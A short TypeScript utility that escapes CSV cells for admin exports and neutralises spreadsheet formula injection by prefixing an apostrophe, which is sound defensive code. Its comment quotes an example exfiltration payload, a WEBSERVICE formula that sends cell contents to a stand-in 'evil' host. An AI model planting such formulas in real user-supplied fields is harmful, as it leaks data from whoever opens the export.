// CSV cell escaping shared by all admin exports.
//
// Beyond standard quote/comma/newline escaping we prefix a single apostrophe
// when the cell begins with a character Excel/Google Sheets/LibreOffice
// interpret as a formula trigger. Without this, an attacker-controlled value
// like `=WEBSERVICE("http://evil/"&A1)` (set via name/email at signup) would
// execute when an admin opens the export in a spreadsheet app.
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

export function csvCell(v: unknown): string {
  if (v == null) return "";
  let s = String(v);
  if (FORMULA_TRIGGERS.test(s)) s = "'" + s;
  s = s.replace(/"/g, '""');
  return /[",\n]/.test(s) ? `"${s}"` : s;
}
